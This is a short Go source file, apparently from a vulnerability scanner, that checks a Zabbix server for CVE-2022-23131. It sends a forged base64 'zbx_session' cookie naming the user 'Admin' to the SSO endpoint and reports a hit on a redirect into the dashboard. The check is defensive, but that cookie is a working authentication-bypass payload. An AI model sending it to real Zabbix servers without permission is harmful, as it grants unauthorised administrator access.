package zabbix

import (
	"Predator/pkg/utils"
	"strings"
)

func CVE_2022_23131(zabbixurl string) bool {
	header := make(map[string]string)
	header["Cookie"] = "zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9"
	if req, err := utils.HttpRequset(zabbixurl+"/index_sso.php", "GET", "", false, header); err == nil {
		if req.StatusCode == 302 && strings.Contains(req.Location, "zabbix.php?action") {
			return true
		}
	}
	return false
}